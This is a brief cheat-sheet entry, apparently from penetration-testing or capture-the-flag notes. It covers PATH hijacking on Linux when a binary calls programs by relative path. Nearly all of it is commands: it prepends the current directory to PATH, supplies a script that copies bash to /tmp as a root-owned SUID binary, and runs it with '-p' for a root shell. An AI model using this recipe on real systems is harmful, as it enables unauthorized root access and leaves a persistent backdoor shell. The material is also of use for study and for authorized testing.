# Path Hijacking

Used when we see relative paths inside `strings`, `strace`, or `ltrace`.

```bash
PATH=.:${PATH}
export PATH
echo $PATH
```

Expected output

```bash
.:/usr/local/sbin:/usr/local/bin...
```

We can now create a file with the following contents to exploit

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chown root:root /tmp/bash
chmod u+s /tmp/bash
```

We can now privesc after creating the SUID bash file with:

```bash
/tmp/bash -p
```

